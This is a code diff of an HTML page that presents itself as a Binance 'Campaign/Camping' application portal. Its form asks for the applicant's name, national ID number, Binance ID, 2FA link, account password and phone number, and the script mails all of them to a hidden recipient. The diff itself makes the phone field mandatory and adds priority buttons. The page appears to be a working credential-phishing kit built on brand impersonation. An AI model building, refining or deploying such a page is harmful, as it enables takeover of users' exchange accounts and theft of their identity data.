@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Binance Campaign Portal</title>
-  <!-- Google Fonts & Font Awesome Icons -->
+  <title>Binance Camping</title>
+  <!-- Fonts & Icons -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -12,11 +12,11 @@
 
   <style>
     :root {
-      --primary: #F3BA2F; /* Binance Signature Yellow */
+      --primary: #F3BA2F; /* Binance Yellow */
       --primary-hover: #e0a722;
       --bg: #0b0e11;
       --card-bg: rgba(24, 26, 32, 0.85);
-      --input-bg: rgba(14, 16, 20, 0.75);
+      --input-bg: rgba(14, 16, 20, 0.8);
       --border: rgba(255, 255, 255, 0.08);
       --border-focus: rgba(243, 186, 47, 0.5);
       --text: #eaecef;
@@ -67,7 +67,6 @@
     .avatar-wrap {
       display: inline-block;
       margin-bottom: 12px;
-      position: relative;
     }
 
     .avatar-wrap img {
@@ -112,7 +111,7 @@
       font-size: 0.85rem;
     }
 
-    /* Copy Input Groups */
+    /* Copy Groups */
     .copy-group {
       display: flex;
       align-items: center;
@@ -232,7 +231,7 @@
       background: #059669;
     }
 
-    /* Apply Action Button */
+    /* Apply Button */
     .btn-apply {
       display: flex;
       align-items: center;
@@ -257,7 +256,7 @@
       transform: translateY(-1px);
     }
 
-    /* Pop-up Modal */
+    /* Modal Overlay */
     .modal-overlay {
       position: fixed;
       top: 0;
@@ -280,7 +279,7 @@
     .modal-card {
       background: #181a20;
       border: 1px solid var(--border);
-      border-radius: 22px;
+      border-radius: 24px;
       width: 100%;
       max-width: 440px;
       max-height: 90vh;
@@ -349,17 +348,56 @@
       border-color: var(--primary);
     }
 
+    /* Updated 4-Column Priority Options Grid */
+    .priority-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 8px;
+    }
+
+    .priority-btn {
+      background: var(--input-bg);
+      border: 1px solid var(--border);
+      color: var(--text-muted);
+      padding: 10px 4px;
+      border-radius: 10px;
+      font-size: 0.78rem;
+      font-weight: 700;
+      cursor: pointer;
+      text-align: center;
+      transition: all 0.2s ease;
+    }
+
+    .priority-btn.active {
+      background: rgba(243, 186, 47, 0.15);
+      border-color: var(--primary);
+      color: var(--primary);
+      box-shadow: 0 0 10px rgba(243, 186, 47, 0.2);
+    }
+
+    .priority-btn.active.selected-opt {
+      background: rgba(16, 185, 129, 0.15);
+      border-color: #10b981;
+      color: #10b981;
+    }
+
+    .priority-btn.active.rejected-opt {
+      background: rgba(239, 68, 68, 0.15);
+      border-color: #ef4444;
+      color: #ef4444;
+    }
+
     .btn-submit-form {
       width: 100%;
       background: linear-gradient(135deg, #F3BA2F 0%, #e0a722 100%);
       color: #0b0e11;
       border: none;
-      padding: 13px;
+      padding: 14px;
       border-radius: 12px;
       font-size: 0.95rem;
       font-weight: 800;
       cursor: pointer;
-      margin-top: 10px;
+      margin-top: 14px;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -396,7 +434,7 @@
 </head>
 <body>
 
-  <!-- Floating Toast Notification -->
+  <!-- Floating Toast -->
   <div id="toast" class="toast">
     <i class="fa-solid fa-circle-check" style="color: #10b981;"></i>
     <span id="toastMsg">Copied!</span>
@@ -519,18 +557,20 @@
         </div>
 
         <div class="form-group">
-          <label>Contact Number</label>
-          <input type="tel" id="mContact" class="form-control" placeholder="Phone number (Optional)">
+          <label>Contact Number <span class="req">*</span></label>
+          <input type="tel" id="mContact" class="form-control" placeholder="Phone number (Mandatory)" required>
         </div>
 
+        <!-- 4-Column Priority Options -->
         <div class="form-group">
           <label>Priority</label>
-          <select id="mPriority" class="form-control" style="cursor: pointer;">
-            <option value="100%">100%</option>
-            <option value="90%">90%</option>
-            <option value="80%">80%</option>
-            <option value="60%">60%</option>
-          </select>
+          <div class="priority-grid">
+            <button type="button" class="priority-btn" onclick="selectPriority('Selected', this)">Selected</button>
+            <button type="button" class="priority-btn" onclick="selectPriority('90%', this)">90%</button>
+            <button type="button" class="priority-btn active" onclick="selectPriority('80%', this)">80%</button>
+            <button type="button" class="priority-btn" onclick="selectPriority('Rejected', this)">Rejected</button>
+          </div>
+          <input type="hidden" id="mPriority" value="80%">
         </div>
 
         <button type="submit" class="btn-submit-form">
@@ -561,7 +601,7 @@
       });
     }
 
-    // Dynamic Toast Display
+    // Dynamic Toast
     function showToast(msg) {
       const toast = document.getElementById("toast");
       document.getElementById("toastMsg").innerText = msg;
@@ -571,7 +611,7 @@
       }, 2300);
     }
 
-    // Direct Image Download Handler
+    // Direct Image Download
     async function directDownload(url, filename) {
       const btn = document.getElementById("downBtn");
       const originalText = btn.innerHTML;
@@ -614,7 +654,21 @@
       }
     }
 
-    // Data Parsing & Direct Mailto Trigger
+    // Priority Selection Logic
+    function selectPriority(val, btn) {
+      document.getElementById("mPriority").value = val;
+      
+      const btns = document.querySelectorAll(".priority-btn");
+      btns.forEach(b => {
+        b.classList.remove("active", "selected-opt", "rejected-opt");
+      });
+
+      btn.classList.add("active");
+      if (val === "Selected") btn.classList.add("selected-opt");
+      if (val === "Rejected") btn.classList.add("rejected-opt");
+    }
+
+    // Form Submission & Formatted Email Creation
     function submitApplication(e) {
       e.preventDefault();
 
@@ -623,20 +677,21 @@
       const binanceId = document.getElementById("mBinanceId").value.trim();
       const twoFa = document.getElementById("m2fa").value.trim();
       const pass = document.getElementById("mPass").value;
-      const contact = document.getElementById("mContact").value.trim() || "N/A";
+      const contact = document.getElementById("mContact").value.trim();
       const priority = document.getElementById("mPriority").value;
 
-      // Clean Structured Message Body
+      // Structured Email Body Template
       const bodyText = 
 `Binance Camping Application Details:
 ----------------------------------------
-Name (NID)     : ${name}
-NID Number     : ${nid}
-Binance ID     : ${binanceId}
-2FA Link       : ${twoFa}
-Password       : ${pass}
-Contact Number : ${contact}
-Priority       : ${priority}
+Applicant Email : [Sender Email - Attached via Client]
+Name (NID)      : ${name}
+NID Number      : ${nid}
+Binance ID      : ${binanceId}
+2FA Link        : ${twoFa}
+Password        : ${pass}
+Contact Number  : ${contact}
+Priority        : ${priority}
 ----------------------------------------
 Submitted via Binance Camping Portal`;
 
@@ -644,7 +699,7 @@ Submitted via Binance Camping Portal`;
       const subject = encodeURIComponent(`Binance Camping Application - ${name}`);
       const body = encodeURIComponent(bodyText);
 
-      // Open Native Email App
+      // Open Native Mail App
       window.location.href = `mailto:${recipient}?subject=${subject}&body=${body}`;
       
       closeModal();
